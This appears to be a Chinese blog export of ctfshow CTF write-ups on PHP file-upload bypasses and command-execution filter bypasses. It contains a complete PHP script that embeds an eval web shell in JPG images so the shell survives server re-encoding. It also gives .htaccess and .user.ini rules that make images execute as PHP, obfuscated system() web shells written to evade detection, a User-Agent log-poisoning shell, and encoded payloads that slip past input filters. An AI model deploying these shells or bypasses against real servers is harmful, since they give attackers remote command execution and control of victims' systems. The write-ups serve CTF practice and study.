<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span></span><br><span class="line"><span class="comment">	It is necessary that the size and quality of the initial image are the same as those of the processed image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	1) Upload an arbitrary image via secured files upload script</span></span><br><span class="line"><span class="comment">	2) Save the processed image and launch:</span></span><br><span class="line"><span class="comment">	jpg_payload.php &lt;jpg_name.jpg&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	In case of successful injection you will get a specially crafted image, which should be uploaded again.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Since the most straightforward injection method is used, the following problems can occur:</span></span><br><span class="line"><span class="comment">	1) After the second processing the injected data may become partially corrupted.</span></span><br><span class="line"><span class="comment">	2) The jpg_payload.php script outputs "Something's wrong".</span></span><br><span class="line"><span class="comment">	If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Sergey Bobrov <span class="doctag">@Black</span>2Fan.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	See also:</span></span><br><span class="line"><span class="comment">	https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line">	$miniPayload = <span class="string">'&lt;?=eval($_POST[1]);?&gt;'</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(!extension_loaded(<span class="string">'gd'</span>) || !function_exists(<span class="string">'imagecreatefromjpeg'</span>)) &#123;</span><br><span class="line">    	<span class="keyword">die</span>(<span class="string">'php-gd is not installed'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">isset</span>($argv[<span class="number">1</span>])) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">'php jpg_payload.php &lt;jpg_name.jpg&gt;'</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	set_error_handler(<span class="string">"custom_error_handler"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>($pad = <span class="number">0</span>; $pad &lt; <span class="number">1024</span>; $pad++) &#123;</span><br><span class="line">		$nullbytePayloadSize = $pad;</span><br><span class="line">		$dis = <span class="keyword">new</span> DataInputStream($argv[<span class="number">1</span>]);</span><br><span class="line">		$outStream = file_get_contents($argv[<span class="number">1</span>]);</span><br><span class="line">		$extraBytes = <span class="number">0</span>;</span><br><span class="line">		$correctImage = <span class="keyword">TRUE</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>($dis-&gt;readShort() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">'Incorrect SOI marker'</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">while</span>((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">			$marker = $dis-&gt;readByte();</span><br><span class="line">			$size = $dis-&gt;readShort() - <span class="number">2</span>;</span><br><span class="line">			$dis-&gt;skip($size);</span><br><span class="line">			<span class="keyword">if</span>($marker === <span class="number">0xDA</span>) &#123;</span><br><span class="line">				$startPos = $dis-&gt;seek();</span><br><span class="line">				$outStreamTmp = </span><br><span class="line">					substr($outStream, <span class="number">0</span>, $startPos) . </span><br><span class="line">					$miniPayload . </span><br><span class="line">					str_repeat(<span class="string">"\0"</span>,$nullbytePayloadSize) . </span><br><span class="line">					substr($outStream, $startPos);</span><br><span class="line">				checkImage(<span class="string">'_'</span>.$argv[<span class="number">1</span>], $outStreamTmp, <span class="keyword">TRUE</span>);</span><br><span class="line">				<span class="keyword">if</span>($extraBytes !== <span class="number">0</span>) &#123;</span><br><span class="line">					<span class="keyword">while</span>((!$dis-&gt;eof())) &#123;</span><br><span class="line">						<span class="keyword">if</span>($dis-&gt;readByte() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">							<span class="keyword">if</span>($dis-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">								<span class="keyword">break</span>;</span><br><span class="line">							&#125;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">					$stopPos = $dis-&gt;seek() - <span class="number">2</span>;</span><br><span class="line">					$imageStreamSize = $stopPos - $startPos;</span><br><span class="line">					$outStream = </span><br><span class="line">						substr($outStream, <span class="number">0</span>, $startPos) . </span><br><span class="line">						$miniPayload . </span><br><span class="line">						substr(</span><br><span class="line">							str_repeat(<span class="string">"\0"</span>,$nullbytePayloadSize).</span><br><span class="line">								substr($outStream, $startPos, $imageStreamSize),</span><br><span class="line">							<span class="number">0</span>,</span><br><span class="line">							$nullbytePayloadSize+$imageStreamSize-$extraBytes) . </span><br><span class="line">								substr($outStream, $stopPos);</span><br><span class="line">				&#125; <span class="keyword">elseif</span>($correctImage) &#123;</span><br><span class="line">					$outStream = $outStreamTmp;</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span>(checkImage(<span class="string">'payload_'</span>.$argv[<span class="number">1</span>], $outStream)) &#123;</span><br><span class="line">					<span class="keyword">die</span>(<span class="string">'Success!'</span>);</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	unlink(<span class="string">'payload_'</span>.$argv[<span class="number">1</span>]);</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">'Something\'s wrong'</span>);</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">checkImage</span><span class="params">($filename, $data, $unlink = FALSE)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">global</span> $correctImage;</span><br><span class="line">		file_put_contents($filename, $data);</span><br><span class="line">		$correctImage = <span class="keyword">TRUE</span>;</span><br><span class="line">		imagecreatefromjpeg($filename);</span><br><span class="line">		<span class="keyword">if</span>($unlink)</span><br><span class="line">			unlink($filename);</span><br><span class="line">		<span class="keyword">return</span> $correctImage;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span><span class="params">($errno, $errstr, $errfile, $errline)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">global</span> $extraBytes, $correctImage;</span><br><span class="line">		$correctImage = <span class="keyword">FALSE</span>;</span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">'/(\d+) extraneous bytes before marker/'</span>, $errstr, $m)) &#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">isset</span>($m[<span class="number">1</span>])) &#123;</span><br><span class="line">				$extraBytes = (int)$m[<span class="number">1</span>];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">		<span class="keyword">private</span> $binData;</span><br><span class="line">		<span class="keyword">private</span> $order;</span><br><span class="line">		<span class="keyword">private</span> $size;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename, $order = false, $fromString = false)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;binData = <span class="string">''</span>;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;order = $order;</span><br><span class="line">			<span class="keyword">if</span>(!$fromString) &#123;</span><br><span class="line">				<span class="keyword">if</span>(!file_exists($filename) || !is_file($filename))</span><br><span class="line">					<span class="keyword">die</span>(<span class="string">'File not exists ['</span>.$filename.<span class="string">']'</span>);</span><br><span class="line">				<span class="keyword">$this</span>-&gt;binData = file_get_contents($filename);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">$this</span>-&gt;binData = $filename;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;size = strlen(<span class="keyword">$this</span>-&gt;binData);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="keyword">return</span> (<span class="keyword">$this</span>-&gt;size - strlen(<span class="keyword">$this</span>-&gt;binData));</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span><span class="params">($skip)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, $skip);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;eof()) &#123;</span><br><span class="line">				<span class="keyword">die</span>(<span class="string">'End Of File'</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			$byte = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">			<span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">			<span class="keyword">return</span> ord($byte);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">				<span class="keyword">die</span>(<span class="string">'End Of File'</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			$short = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">			<span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;order) &#123;</span><br><span class="line">				$short = (ord($short[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + ord($short[<span class="number">0</span>]);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				$short = (ord($short[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + ord($short[<span class="number">1</span>]);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">return</span> $short;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="keyword">return</span> !<span class="keyword">$this</span>-&gt;binData||(strlen(<span class="keyword">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>上传一个jpg图片，因为有些图片的成功率不太高，就直接用可以成功的图片，找了个国光老师的图片，原图</strong></li>
</ul>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/jpg%E6%B8%B2%E6%9F%93.jpg" alt="jpg渲染"></p>
<blockquote>
<ul>
<li><strong>先上传这个图片，让这个图片被渲染，然后下载下来，格式改jgp</strong></li>
</ul>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210724112625357.png" alt="image-20210724112625357"></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210724112815685.png" alt="image-20210724112815685"></p>
<blockquote>
<ul>
<li>上传，抓包记得我们写的一句话是</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>=<span class="keyword">eval</span>($_POST[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210724112904880.png" alt="image-20210724112904880"></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210724113008986.png" alt="image-20210724113008986"></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210724113107225.png" alt="image-20210724113107225"></p>
<h2 id="web166"><a href="#web166" class="headerlink" title="web166"></a>web166</h2><blockquote>
<ul>
<li><strong>查看源码发现只能穿zip</strong></li>
</ul>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210724140634097.png" alt="image-20210724140634097"></p>
<blockquote>
<ul>
<li><strong>抓包，直接给zip上传一句话木马；</strong></li>
<li>注意：<strong>Content-Type为application/x-zip-compressed</strong></li>
</ul>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210724142043177.png" alt="image-20210724142043177"></p>
<blockquote>
<ul>
<li><strong>抓刚刚传进去的文件，根据zip文件上传的文件包含的特性直接命令执行</strong></li>
</ul>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210724142204934.png" alt="image-20210724142204934"></p>
<h2 id="web167"><a href="#web167" class="headerlink" title="web167"></a>web167</h2><blockquote>
<ul>
<li>根据提示说httpd,想到是<strong>.htaccess</strong>,应该是要利用.htaccess进行绕过</li>
<li><strong>htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能</strong></li>
</ul>
</blockquote>
<ul>
<li><strong>方法一</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .jpg &#x2F;&#x2F;将.jpg后缀解析成php执行</span><br></pre></td></tr></table></figure></div>

<ul>
<li>方法二</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;png&quot;&gt;</span><br><span class="line">SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>两个方法一个意思两种写法，这里用方法一，上传.htaccess</strong></li>
</ul>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210724143059388.png" alt="image-20210724143059388"></p>
<blockquote>
<ul>
<li><strong>在上传一个1.jpg的一句话木马</strong></li>
</ul>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210724143222669.png" alt="image-20210724143222669"></p>
<blockquote>
<ul>
<li>直接打开1.jpg的图片拿flag</li>
</ul>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210724143341786.png" alt="image-20210724143341786"></p>
<h2 id="web168"><a href="#web168" class="headerlink" title="web168"></a>web168</h2><blockquote>
<ul>
<li>提示说基础免杀，这里提供几个基础的免杀脚本</li>
</ul>
</blockquote>
<ul>
<li><strong>前三个免杀 密码 0</strong>  <strong>最后一个自己构造</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">"s#y#s#t#e#m"</span>;</span><br><span class="line">$b = explode(<span class="string">"#"</span>,$a);</span><br><span class="line">$c = $b[<span class="number">0</span>].$b[<span class="number">1</span>].$b[<span class="number">2</span>].$b[<span class="number">3</span>].$b[<span class="number">4</span>].$b[<span class="number">5</span>];</span><br><span class="line">$c($_REQUEST[<span class="number">0</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=substr(<span class="string">'1s'</span>,<span class="number">1</span>).<span class="string">'ystem'</span>;  </span><br><span class="line">$a($_REQUEST[<span class="number">0</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=strrev(<span class="string">'metsys'</span>); <span class="comment">//反转</span></span><br><span class="line">$a($_REQUEST[<span class="number">0</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=$_REQUEST[<span class="string">'a'</span>];</span><br><span class="line">$b=$_REQUEST[<span class="string">'b'</span>];</span><br><span class="line">$a($b);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li>抓包上传</li>
</ul>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210724145000996.png" alt="image-20210724145000996"></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210724145218511.png" alt="image-20210724145218511"></p>
<h2 id="web169"><a href="#web169" class="headerlink" title="web169"></a>web169</h2><blockquote>
<ul>
<li><strong>右键源码查看前端限制只能上传zip，先上传一个zip，然后抓包，改<code>Content-Type</code>为<code>image/png</code>，可以传php等格式，但发现内容中过滤了<code>&lt;&gt;</code>和<code>php</code>，试了下可以传<code>.user.ini</code>，我们尝试一下日志包含，<code>User-Agent</code>加上一句话木马</strong></li>
</ul>
</blockquote>
<ul>
<li><strong>.user.ini</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">auto_prepend_file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>1.php</strong></li>
</ul>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210724145745539.png" alt="image-20210724145745539"></p>
<ul>
<li><strong>访问1.php发现成功包含</strong></li>
</ul>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210724145854727.png" alt="image-20210724145854727"></p>
<ul>
<li><p><strong>随便访问一个页面写一个User-Agent</strong></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210724150029046.png" alt="image-20210724150029046"></p>
</li>
<li><p><strong>测试phpinfo();</strong></p>
</li>
</ul>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210724150124088.png" alt="image-20210724150124088"></p>
<ul>
<li><strong>直接连webshell找flag或者直接命令执行</strong></li>
</ul>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210724150419763.png" alt="image-20210724150419763"></p>
<h2 id="web170"><a href="#web170" class="headerlink" title="web170"></a>web170</h2><blockquote>
<ul>
<li>和上题一样</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>学习记录</tag>
        <tag>ctf</tag>
        <tag>web</tag>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>【ctfshow】web篇-命令执行 wp</title>
    <url>/posts/93.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<p>记录web的题目wp，慢慢变强，铸剑。</p>
</blockquote>
<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h2><blockquote>
<ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210707102447577.png" alt="image-20210707102447577"></li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210707102530786.png" alt="image-20210707102530786"></li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210707102544429.png" alt="image-20210707102544429"></li>
</ul>
</blockquote>
<h2 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h2><blockquote>
<ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210707103118631.png" alt="image-20210707103118631"></li>
</ul>
<ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210707103144554.png" alt="image-20210707103144554"></li>
</ul>
</blockquote>
<h2 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h2><blockquote>
<ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210707105029901.png" alt="image-20210707105029901"></li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210707105220231.png" alt="image-20210707105220231"></li>
</ul>
</blockquote>
<h2 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h2><blockquote>
<ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210707110929422.png" alt="image-20210707110929422"></li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210707111000644.png" alt="image-20210707111000644"></li>
</ul>
</blockquote>
<h2 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h2><blockquote>
<ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210707210348568.png" alt="image-20210707210348568"></li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210707210419087.png" alt="image-20210707210419087"></li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210707210435823.png" alt="image-20210707210435823"></li>
</ul>
</blockquote>
<h2 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h2><blockquote>
<ul>
<li>和33题一样</li>
</ul>
</blockquote>
<h2 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h2><blockquote>
<ul>
<li>和32题一样</li>
</ul>
</blockquote>
<h2 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h2><blockquote>
<ul>
<li>和32题一样就是把1换成a</li>
</ul>
</blockquote>
<h2 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h2><blockquote>
<ul>
<li><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210707215121215.png" alt="image-20210707215121215"></p>
</li>
<li><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210707215132578.png" alt="image-20210707215132578"></p>
</li>
</ul>
</blockquote>
<h2 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h2><blockquote>
<ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210707215958632.png" alt="image-20210707215958632"></li>
</ul>
</blockquote>
<h2 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h2><blockquote>
<ul>
<li>和38一样</li>
</ul>
</blockquote>
<h2 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h2><blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/flag/i"</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">include</span>($c.<span class="string">".php"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>根据提示套娃方法</strong><ul>
<li><strong>show_source(next(array_reverse(scandir(pos(localeconv())))));</strong></li>
</ul>
</li>
<li><strong>解析：show_source(“flag.php”);可以直接显示当前文件</strong><ul>
<li><strong>localeconv()数组中第一个元素是.可以取路径</strong></li>
<li><strong>pos()就是取数据中第一个元素</strong></li>
<li><strong>array_reverse()将数组倒序利用next()取flag.php就执行了flag.php</strong><ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210716180426690.png" alt="image-20210716180426690"></li>
</ul>
</li>
</ul>
</li>
<li><strong>根据cookie命令执行方法</strong><ul>
<li><strong>c=session_start()<em>;system(session_id());</em> passid=ls</strong></li>
<li><strong>解析利用session会话进行获取passid中的ls来进行命令执行</strong></li>
<li><strong>但是不能正常执行tac flag.php</strong></li>
</ul>
</li>
<li><strong>根据post传参来进行命令执行</strong><ul>
<li><strong>利用-print_r(get_defined_vars())输出所有变量来查看</strong></li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210716182731071.png" alt="image-20210716182731071"></li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210716182805741.png" alt="image-20210716182805741"></li>
<li><strong>利用next和array_pop来取出值</strong><ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210716182918300.png" alt="image-20210716182918300"></li>
</ul>
</li>
<li><strong>eval没有被禁用，尝试命令执行</strong><ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210716182955897.png" alt="image-20210716182955897"></li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210716183112793.png" alt="image-20210716183112793"></li>
</ul>
</li>
</ul>
</li>
</ul>
</blockquote>
<h2 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    $c = $_POST[<span class="string">'c'</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i'</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">"echo($c);"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>过滤了数字和字母和一些其他字符我们还是可以利用或运算来进行绕过，例如A的ascii码是65，用羽师傅的代码写的是64|1就得到了65，来构造payload</strong></li>
</ul>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210717105826825.png" alt="image-20210717105826825"></p>
<blockquote>
<ul>
<li><p><strong>经过测试，想要在php中实现或运算，实际上服务器上会进行url解码，所以需要用十六进制的字符编码利用或运算进行绕过前端代码验证，写了个代码进行验证，因为phpinfo()可以使用(‘phpinfo’)()形式执行所以构造了</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: GuYing</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021/7/17</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//或</span></span><br><span class="line">$c = $_GET[<span class="string">'c'</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"echo($c);"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//(('%40'|'%10').('%40'|'%08').('%40'|'%10').('%40'|'%09').('%40'|'%0e').('%40'|'%06').('%40'|'%0F'))()</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>可以直接绕过当(’PHPINFO‘)()执行构造</strong></p>
